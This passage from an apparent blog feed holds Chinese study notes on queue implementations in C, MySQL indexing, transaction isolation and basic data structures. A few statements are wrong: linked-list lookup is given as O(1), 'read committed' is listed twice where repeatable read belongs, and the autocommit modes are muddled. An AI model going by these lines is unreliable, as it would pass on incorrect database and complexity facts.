"+1"，指向新的对头</span></span><br><span class="line">    x = Q.data[Q.front];</span><br><span class="line">    <span class="comment">// 取余的目的是为了使循环队列的尾部回到头部</span></span><br><span class="line">    Q.front = (Q.front + <span class="number">1</span>) % MaxSize;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取队列长度</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param Q</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">QueueLength</span><span class="params">(SqQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (Q.rear-Q.front+MaxSize) % MaxSize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="队列的链式存储"><a href="#队列的链式存储" class="headerlink" title="队列的链式存储"></a>队列的链式存储</h2><p>在链表的基础上实现的队列结构。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 队列的链式存储</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 队列结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    LinkNode *front;    <span class="comment">// 链表头</span></span><br><span class="line">    LinkNode *rear;     <span class="comment">// 链表尾</span></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 初始化队列</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param Q</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InitLinkQueue</span><span class="params">(LinkQueue &amp;Q)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 申请一个头结点，头和尾指向同一个节点</span></span><br><span class="line">    Q.front = Q.rear = (LinkNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LinkNode));</span><br><span class="line">    Q.front-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断队列是否为空</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param Q</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">LinkQueueEmpty</span><span class="params">(LinkQueue Q)</span></span>&#123;</span><br><span class="line">    <span class="comment">// 头和尾指向同一个节点即为空</span></span><br><span class="line">    <span class="keyword">if</span> (Q.front == Q.rear) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 入队（尾插法）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param Q</span></span><br><span class="line"><span class="comment"> * @param x</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnLinkQueue</span><span class="params">(LinkQueue &amp;Q, ElemType x)</span></span>&#123;</span><br><span class="line">    LinkNode *s = (LinkNode*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span> (LinkNode));</span><br><span class="line">    s-&gt;data = x;</span><br><span class="line">    Q.rear-&gt;next = s;</span><br><span class="line">    Q.rear = s;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 出队（头部删除法）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param Q</span></span><br><span class="line"><span class="comment"> * @param x</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">DeLinkQueue</span><span class="params">(LinkQueue &amp;Q, ElemType &amp;x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (LinkQueueEmpty(Q)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 因为是先进先出，所以头部删除法，删除的是第一个元素</span></span><br><span class="line">    LinkNode *p;</span><br><span class="line">    p = Q.front-&gt;next;</span><br><span class="line">    x = p-&gt;data;</span><br><span class="line">    Q.front-&gt;next = p-&gt;next;</span><br><span class="line">    <span class="comment">// 这里需要判断删除节点是否是最后一个元素，如果是则需要把头和尾指向同一个节点</span></span><br><span class="line">    <span class="keyword">if</span> (Q.rear == p)</span><br><span class="line">    &#123;</span><br><span class="line">        Q.rear = Q.front;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>05 深入浅出索引（下）</title>
      <link href="/introduction-to-the-index-part-2/"/>
      <url>/introduction-to-the-index-part-2/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ol><li>覆盖索引优化，避免多次回表</li><li>了解联合索引及最左前缀原则</li><li>了解索引下推</li></ol><a id="more"></a><h2 id="覆盖索引"><a href="#覆盖索引" class="headerlink" title="覆盖索引"></a>覆盖索引</h2><p>有一张初始表 T：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table T (</span><br><span class="line">ID int primary key,</span><br><span class="line">k int NOT NULL DEFAULT 0, </span><br><span class="line">s varchar(16) NOT NULL DEFAULT &#39;&#39;,</span><br><span class="line">index k(k))</span><br><span class="line">engine&#x3D;InnoDB;</span><br><span class="line"> </span><br><span class="line">insert into T values(100,1, &#39;aa&#39;),(200,2,&#39;bb&#39;),(300,3,&#39;cc&#39;),(500,5,&#39;ee&#39;),(600,6,&#39;ff&#39;),(700,7,&#39;gg&#39;);</span><br></pre></td></tr></table></figure><p>此时执行 <code>select * from T where k between 3 and 5</code>，需要执行几次树的搜索操作，会扫描多少行？</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220605192358.png" alt=""></p><p>上面那条 SQL 查询语句的执行流程：</p><ol><li>在 k 索引树上找到 k=3 的记录，取得 ID = 300；</li><li>再到 ID 索引树查到 ID=300 对应的 R3；</li><li>在 k 索引树取下一个值 k=5，取得 ID=500；</li><li>再回到 ID 索引树查到 ID=500 对应的 R4；</li><li>在 k 索引树取下一个值 k=6，不满足条件，循环结束。</li></ol><p>在这个过程中，回到主键索引树搜索的过程，我们称为回表。可以看到，这个查询过程读了 k 索引树的 3 条记录（步骤 1、3 和 5），回表了两次（步骤 2 和 4）。</p><p>在这个例子中，由于查询结果所需要的数据只在主键索引上有，所以不得不回表。那么，有没有可能经过索引优化，避免回表过程呢？</p><p>如果执行的语句是 <code>select ID from T where k between 3 and 5</code>，这时只需要查 ID 的值，而 ID 的值已经在 k 索引树上了，因此可以直接提供查询结果，不需要通过回表才能拿到。</p><p>也就是说，在这个查询里面，索引 k 已经“覆盖了”我们的查询需求，我们称为覆盖索引。</p><p><strong>由于覆盖索引可以减少树的搜索次数，显著提升查询性能，所以使用覆盖索引是一个常用的性能优化手段。</strong></p><h2 id="最左前缀原则"><a href="#最左前缀原则" class="headerlink" title="最左前缀原则"></a>最左前缀原则</h2><p>为了提高多条件查询效率，可建立联合索引，遵循”最左前缀匹配原则“。</p><p>最左前缀匹配原则是指在使用 B+Tree 联合索引进行数据检索时，MySQL 优化器会读取谓词（过滤条件）<strong>并按照联合索引字段创建顺序一直向右匹配直到遇到范围查询或非等值查询后停止匹配</strong>，此字段之后的索引列不会被使用。</p><p>假如此时有一张市民表是这样定义的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE &#96;tuser&#96; (</span><br><span class="line">  &#96;id&#96; int(11) NOT NULL,</span><br><span class="line">  &#96;id_card&#96; varchar(32) DEFAULT NULL,</span><br><span class="line">  &#96;name&#96; varchar(32) DEFAULT NULL,</span><br><span class="line">  &#96;age&#96; int(11) DEFAULT NULL,</span><br><span class="line">  &#96;ismale&#96; tinyint(1) DEFAULT NULL,</span><br><span class="line">  PRIMARY KEY (&#96;id&#96;),</span><br><span class="line">  KEY &#96;id_card&#96; (&#96;id_card&#96;),</span><br><span class="line">  KEY &#96;name_age&#96; (&#96;name&#96;,&#96;age&#96;)</span><br><span class="line">) ENGINE&#x3D;InnoDB</span><br></pre></td></tr></table></figure><p>我们用（name，age）这个联合索引来分析。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220605192427.png" alt=""><br>可以看到，索引项是按照索引定义里面出现的字段顺序排序的。</p><p>当你的逻辑需求是查到所有名字是“张三”的人时，可以快速定位到 ID4，然后向后遍历得到所有需要的结果。</p><p>如果你要查的是所有名字第一个字是“张”的人，你的 SQL 语句的条件是”where name like ‘张 %’”。这时，你也能够用上这个索引，查找到第一个符合条件的记录是 ID3，然后向后遍历，直到不满足条件为止。</p><p>可以看到，不只是索引的全部定义，只要满足最左前缀，就可以利用索引来加速检索。这个最左前缀可以是联合索引的最左 N 个字段，也可以是字符串索引的最左 M 个字符。</p><p><strong>如果通过调整顺序，可以少维护一个索引，那么这个顺序往往就是需要优先考虑采用的。</strong></p><p>所以当已经有了 (a,b) 这个联合索引后，一般就不需要单独在 a 上建立索引了。</p><p>那么，如果既有联合查询，又有基于 a、b 各自的查询呢？查询条件里面只有 b 的语句，是无法使用 (a,b) 这个联合索引的，这时候你不得不维护另外一个索引，也就是说你需要同时维护 (a,b)、(b) 这两个索引。</p><p>这时候，我们要考虑的原则就是空间了。比如上面这个市民表的情况，name 字段是比 age 字段大的 ，那我就建议你创建一个（name,age) 的联合索引和一个 (age) 的单字段索引。</p><h2 id="索引下推"><a href="#索引下推" class="headerlink" title="索引下推"></a>索引下推</h2><p>还是以市民表的联合索引（name, age）为例。如果现在有一个需求：检索出表中“名字第一个字是张，而且年龄是 10 岁的所有男孩”。那么，SQL 语句是这么写的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from tuser where name like &#39;张 %&#39; and age&#x3D;10 and ismale&#x3D;1;</span><br></pre></td></tr></table></figure><p>你已经知道了前缀索引规则，所以这个语句在搜索索引树的时候，只能用 “张”，找到第一个满足条件的记录 ID3。当然，这还不错，总比全表扫描要好。</p><p>在 MySQL 5.6 之前，只能从 ID3 开始一个个回表。到主键索引上找出数据行，再对比字段值。</p><p>而 MySQL 5.6 引入的索引下推优化（index condition pushdown)， 可以在索引遍历过程中，对索引中包含的字段先做判断，直接过滤掉不满足条件的记录，减少回表次数。</p><p>无索引下推执行流程：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220605192500.png" alt=""><br>在上图中，在 (name,age) 索引里面特意去掉了 age 的值，这个过程 InnoDB 并不会去看 age 的值，只是按顺序把“name 第一个字是’张’”的记录一条条取出来回表。因此，需要回表 4 次。</p><p>索引下推执行流程：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220605192518.png" alt=""></p><p>InnoDB 在 (name,age) 索引内部就判断了 age 是否等于 10，对于不等于 10 的记录，直接判断并跳过。在我们的这个例子中，只需要对 ID4、ID5 这两条记录回表取数据判断，就只需要回表 2 次。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>覆盖索引：如果查询条件使用的是普通索引（或是联合索引的最左原则字段），查询结果是联合索引的字段或主键，此时不用额外回表，直接返回结果，减少IO磁盘读写读取正行数据。</li><li>最左前缀原则：联合索引的最左 N 个字段，也可以是字符串索引的最左 M 个字符。</li><li>联合索引：根据创建联合索引的顺序，以最左原则进行 where 检索，比如(name, age) 这个联合索引，以 name = ‘张三’ 或 name=‘张三’ and age= 1 时可以使用索引，但单独使用 age = 1 时，不会使用索引，考虑到存储空间的问题，还请根据业务需求，将查找频繁的数据进行靠左创建索引，比如name 字段是比 age 字段大的，那么建议创建一个（name,age) 的联合索引和一个 (age) 的单字段索引。</li><li>索引下推：name like ‘张 %’ and age=10 这条 SQL 语句，在 5.6 之前，会对匹配的数据一个个回表，5.6 之后，会先过滤掉age&lt;10的数据，再进行回表查询，减少回表次数，提升检索速度。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>03 事务隔离：为什么你改了我还看不见</title>
      <link href="/transaction-lsolation-why-you-changed-I-can-not-see-it/"/>
      <url>/transaction-lsolation-why-you-changed-I-can-not-see-it/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ol><li>了解 Mysql 的隔离性与隔离级别</li><li>了解长事务存存在的风险</li><li>了解 Mysql 事务隔离的实现及事务的启动方式</li></ol><a id="more"></a><p>简单来说，事务就是要保证一组数据库操作，要么全部成功，要么全部失败。在 MySQL 中，事务支持是在引擎层实现的。</p><p>MyISAM 被 InnoDB 取代的重要原因之一，也是因为 MySQL 原生的 MyISAM 引擎就不支持事务。</p><h2 id="隔离性与隔离级别"><a href="#隔离性与隔离级别" class="headerlink" title="隔离性与隔离级别"></a>隔离性与隔离级别</h2><p>提到事务，就离不开 ACID(Atomicity、Consistency、Isolation、Durability，即原子性、一致性、隔离性、持久性)，今天来说说其中 I，也就是“隔离性”。</p><p>当数据库上有多个事务同时执行的时候，就可能出现：</p><ul><li>脏读(dirty read)：一个事务正在对一条记录做修改，在这个事务完成并提交前，这条记录的数据就处于不一致状态；这时，另一个事务也来读取同一条记录，如果不加控制，第二个事务读取了这些“脏”数据，并据此做进一步的处理，就会产生未提交的数据依赖关系。这种现象被形象的叫作”脏读”。</li><li>不可重复读 (non-repeatable read)：一个事务在读取某些数据后的某个时间，再次读取以前读过的数据，却发现其读出的数据已经发生了改变、或某些记录已经被删除了！这种现象就叫作“ 不可重复读”。</li><li>幻读(phantom read)：一个事务按相同的查询条件重新读取以前检索过的数据，却发现其他事务插入了满足其查询条件的新数据，这种现象就称为“幻读”。</li></ul><p>为了解决上面这些问题，就有了“隔离级别”的概念，SQL 标准的事务隔离级别包括：</p><ul><li>读未提交（read uncommitted）：一个事务还没有提交时，它做的变更就能被别的事务所看到</li><li>读提交（read committed）：一个事务提交之后，它做的变更才会被其他事务所看到</li><li>读提交（read committed）：一个事务执行过程中看到的数据，总是跟这个事务在启动时看到的数据是一致的</li><li>串行化（serializable）：对同一行记录，“写”会加“写锁”，“读”会加“读锁”。当出 现读写锁冲突的时候，后访问的事务必须等前一个事务执行完成，才能继续执行。</li></ul><p>这四种隔离级别下，并行性能依次降低，安全性依次提高。</p><p>查看当前隔离级别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &#39;transaction_isolation&#39;;</span><br></pre></td></tr></table></figure><h2 id="事务隔离的实现"><a href="#事务隔离的实现" class="headerlink" title="事务隔离的实现"></a>事务隔离的实现</h2><p>在 MySQL 中，实际上每条记录在更新的时候都会同时记录一条回滚操作。记录上的最新值，通过回滚操作，都可以得到前一个状态的值。</p><p>假设一个值从 1 被按顺序改成了 2、3、4，在回滚日志里面就会有类似下面的记录。</p><p><img src="inkdrop://file:C02o9xMSe" alt="clipboard.png"></p><p>当前值是 4，但是在查询这条记录的时候，不同时刻启动的事务会有不同的 read-view。如 图中看到的，在视图 A、B、C 里面，这一个记录的值分别是 1、2、4，同一条记录在系统 中可以存在多个版本，就是数据库的多版本并发控制(MVCC)。对于 read-view A，要 得到 1，就必须将当前值依次执行图中所有的回滚操作得到。</p><p>同时你会发现，即使现在有另外一个事务正在将 4 改成 5，这个事务跟 read-view A、B、 C 对应的事务是不会冲突的。</p><blockquote><p>为什么不建议使用长事务？</p></blockquote><p>长事务意味着系统里面会存在很老的事务视图。由于这些事务随时可能访问数据库里面的任何数据，所以这个事务提交之前，数据库里面它可能用到的回滚记录都必须保留，这就会导致大量占用存储空间。</p><p>除了对回滚段的影响，长事务还占用锁资源，也可能拖垮整个库。</p><h2 id="事务的启动方式"><a href="#事务的启动方式" class="headerlink" title="事务的启动方式"></a>事务的启动方式</h2><p>MySQL 的事务启动方式有以下几种:</p><ol><li><code>set autocommit=1</code>，显式启动事务语句，用 begin 或 start transaction 显式启动的事务。配套的提交语句是 commit，回滚语 句是 rollback。</li><li><code>set autocommit=0</code>，这个命令会将这个线程的自动提交关掉。意味着如果你只执行一 个 select 语句，这个事务就启动了，而且并不会自动提交。这个事务持续存在直到你主动执行 commit 或 rollback 语句，或者断开连接。</li></ol><p>建议总是使用第一种 <code>set autocommit=1</code>, 通过显式语句的方式来启动事务，因为第二种方式在长连接的情况下，可能会导致意外的长事务。</p><p>回滚日志是不可能一直保留的，当事务在不需要的时候，就会被删除，也就是说，系统会判断，当没有事务再需要用到这些回滚日志时，回滚日志就会被删除。</p><blockquote><p>什么时候才不需要了呢？</p></blockquote><p>就是当系统里没有比这个回滚日志更早的 read-view 的时候。</p><p>可以在 <code>information_schema</code> 库的 <code>innodb_trx</code> 这个表中查询长事务，比如下面这个语句，用于查找持续时间超过 60s 的事务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from information_schema.innodb_trx where TIME_TO_SEC(timediff(now(),trx_started))&gt;60;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>04 深入浅出索引（上）</title>
      <link href="/introduction-to-the-index-part-1/"/>
      <url>/introduction-to-the-index-part-1/</url>
      
        <content type="html"><![CDATA[<p>本文是基于 <a href="https://time.geekbang.org/column/intro/100020801" target="_blank" rel="noopener">极客时间——MySQL 实战 45 讲</a> 整理的学习笔记，仅供学习参考，请勿用于商业用途，如若侵权，请联系并删除。</p><p>课程重点：</p><ol><li>了解数据库引擎数据结构</li><li>了解索引的常见模型</li><li>指导 InnoDB 为什么要要选择 B+ 树作为索引模型</li></ol><a id="more"></a><h2 id="索引的常见模型"><a href="#索引的常见模型" class="headerlink" title="索引的常见模型"></a>索引的常见模型</h2><p>索引的出现是为了提高查询效率，但是实现索引的方式却有很多种，所以这里也就引入了索引模型的概念。</p><p>常见的三种索引模型：</p><ol><li>哈希表</li><li>有序数组</li><li>搜索树</li></ol><h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><p>哈希表是一种以键 - 值(key-value)存储数据的结构，我们只要输入待查找的值即 key， 就可以找到其对应的值即 Value。</p><p>哈希的思路很简单，把值放在数组里，用一个哈希函数把 key 换算成一个确定的位置，然后把 value 放在数组的这个位置。</p><p>不可避免地，多个 key 值经过哈希函数的换算，会出现同一个值的情况。处理这种情况的 一种方法是，拉出一个链表。</p><p>优点：新增速度很快，只需要往后面追加。<br>缺点：因为不是有序的，区间查询速度很慢。</p><p>总结：哈希表<strong>只适合等值查询的场景</strong>，比如 Memcached 及其他一些 NoSQL 引擎。</p><h3 id="有序数组"><a href="#有序数组" class="headerlink" title="有序数组"></a>有序数组</h3><p>有序数组在等值查询和范围查询场景中的性能就都非常优秀。</p><p>如果仅仅看查询效率，有序数组就是最好的数据结构了。但是，在需要更新数据的时候就麻<br>烦了，你往中间插入一个记录就必须得挪动后面所有的记录，成本太高。</p><p>总结：<strong>有序数组索引只适用于静态存储引擎</strong>。</p><h3 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h3><p>二叉树是搜索效率最高的，但是实际上大多数的数据库存储却并不使用二叉树。<br>其原因是，索引不止存在内存中，还要写到磁盘上。</p><p>想象一下一棵 100 万节点的平衡二叉树，树高 20。一次查询可能需要访问 20 个数 据块。在机械硬盘时代，从磁盘随机读一个数据块需要 10 ms 左右的寻址时间。也就是说，对于一个 100 万行的表，如果使用二叉树来存储，单独访问一个行可能需要 20 个 10 ms 的时间。</p><p>为了让一个查询尽量少地读磁盘，就必须让查询过程访问尽量少的数据块。那么，我们就不 应该使用二叉树，而是要使用“N 叉”树。这里，“N 叉”树中的“N”取决于数据块的大小。</p><h2 id="InnoDB-的索引模型"><a href="#InnoDB-的索引模型" class="headerlink" title="InnoDB 的索引模型"></a>InnoDB 的索引模型</h2><p>在 InnoDB 中，表都是根据主键顺序以索引的形式存放的，这种存储方式的表称为<strong>索引组织表</strong>。又因为前面提到的，InnoDB 使用了 B+ 树索引模型，所以数据都是存储在 B+ 树中的。</p><p>每一个索引在 InnoDB 里面对应一棵 B+ 树。</p><p>假设，有一个主键列为 ID 的表，表中有字段 k，并且在 k 上有索引。 这个表的建表语句是:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table T( id int primary key,</span><br><span class="line">k int not null,</span><br><span class="line">name varchar(16),</span><br><span class="line">index (k))engine&#x3D;InnoDB;</span><br></pre></td></tr></table></figure><p>表中 R1~R5 的 (ID,k) 值分别为 (100,1)、(200,2)、(300,3)、(500,5) 和 (600,6)，两棵树 的示例示意图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20220601225209.png" alt=""></p><p>从图中可以看出，根据叶子节点的内容，索引类型分为主键索引和非主键索引。</p><p>主键索引的叶子节点存的是整行数据。在 InnoDB 里，主键索引也被称为聚簇索引 (clustered index)。</p><p>非主键索引的叶子节点内容是主键的值。在 InnoDB 里，非主键索引也被称为二级索引 (secondary index)。</p><blockquote><p>基于主键索引和普通索引的查询有什么区别?</p></blockquote><ul><li>如果语句是 <code>select * from T where ID=500</code>，即主键查询方式，则只需要搜索 ID 这棵 B+ 树;</li><li>如果语句是 <code>select * from T where k=5</code>，即普通索引查询方式，则需要先搜索 k 索引 树，得到 ID 的值为 500，再到 ID 索引树搜索一次。这个过程称为回表。</li></ul><p>也就是说，基于非主键索引的查询需要多扫描一棵索引树。因此，我们在应用中应该尽量使用主键查询。</p><h2 id="索引维护"><a href="#索引维护" class="headerlink" title="索引维护"></a>索引维护</h2><p>B+ 树为了维护索引有序性，在插入新值的时候需要做必要的维护。以上面这个图为例，如 果插入新的行 ID 值为 700，则只需要在 R5 的记录后面插入一个新记录。如果新插入的 ID 值为 400，就相对麻烦了，需要逻辑上挪动后面的数据，空出位置。</p><p>而更糟的情况是，如果 R5 所在的数据页已经满了，根据 B+ 树的算法，这时候需要申请一 个新的数据页，然后挪动部分数据过去。这个过程称为页分裂。在这种情况下，性能自然会 受影响。</p><p>除了性能外，页分裂操作还影响数据页的利用率。原本放在一个页的数据，现在分到两个页 中，整体空间利用率降低大约 50%。</p><p>当然有分裂就有合并。当相邻两个页由于删除了数据，利用率很低之后，会将数据页做合<br>并。合并的过程，可以认为是分裂过程的逆过程。</p><p>基于以上索引维护过程说明，如果每次插入<br>一条新记录，都是追加操作，都不涉及到挪动其他记录，也不会触发叶子节点的分裂，这样就能最大程度的维护好索引的有序性。</p><p>而这种“自动追加操作”，就是自增主键的插入数据模式。</p><p>而有业务逻辑的字段做主键，则往往不容易保证有序插入，这样写数据成本相对较高。</p><p>除了考虑性能外，我们还可以从存储空间的角度来看。假设你的表中确实有一个唯一字段，<br>比如字符串类型的身份证号，那应该用身份证号做主键，还是用自增字段做主键呢?</p><p>由于每个非主键索引的叶子节点上都是主键的值。如果用身份证号做主键，那么每个二级索 引的叶子节点占用约 20 个字节，而如果用整型做主键，则只要 4 个字节，如果是长整型 (bigint)则是 8 个字节。</p><p><strong>显然，主键长度越小，普通索引的叶子节点就越小，普通索引占用的空间也就越小。</strong></p><p>所以，从性能和存储空间方面考量，自增主键往往是更合理的选择。</p><p>有没有什么场景适合用业务字段直接做主键的呢？还是有的。比如，有些业务的场景需求是这样的:</p><ol><li>只有一个索引;</li><li>该索引必须是唯一索引。</li></ol><p>这就是典型的 KV 场景。由于没有其他索引，所以也就不用考虑其他索引的叶子节点大小的问题。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>InnoDB 采用 B+ 树结构作为索引模型，是因为B+ 树能够很好地配合磁盘的读写特性，减少单次查询的磁盘访问次数。</li><li>由于 InnoDB 是索引组织表，通常会建议创建一个自增主键，这样非主键索引 占用的空间最小。</li><li>尽量使用主键查询，其目的是减少回表。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>八大基本数据结构概述</title>
      <link href="/mathematical-structural-overview/"/>
      <url>/mathematical-structural-overview/</url>
      
        <content type="html"><![CDATA[<p>数据结构是一种具有一定逻辑关系，在计算机中应用某种存储结构，并且封装了相应操作的数据元素集合，常用的数据结构有以下8种：</p><a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221023230841.png" alt=""></p><h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><p>链表是一种非常常见的数据结构，有多种扩展的链表：</p><ul><li>单向链表</li><li>双向链表</li><li>循环链表</li></ul><p>链表的特点是：</p><ul><li>添加删除数据很方便，因为只需要移动指针的指向，然后操作目标元素即可，复杂度为O(1)</li><li>查找数据，速度很慢，复杂度为 O(1)</li><li>链表的数据存储是分散的，无需存储在连续的内存空间中</li></ul><p>适用场景：数据量较小，需要频繁增加，删除操作的场景</p><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>数组也是线性排列的一种数据结构。</p><p>数组的特点是：</p><ul><li>查找数据，速度很快，复杂度为 O(1)</li><li>添加删除数据很慢，因为需要移动元素，复杂度为 O(n)</li><li>数组是存储在一片连续的内存空间中，每个数据的内存地址都可以通过数组下标计算出来</li></ul><p>适用场景：频繁查询，对存储空间要求不大，较少增加和删除的场景</p><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈也是一种数据呈线性排列的数据结构。</p><p>栈的特点是：</p><ul><li>元素只能通过一端进行访问</li><li>先进后出（最先进入的元素，只能最后取出）</li></ul><h2 id="队列"><a href="#队列" class="headerlink" 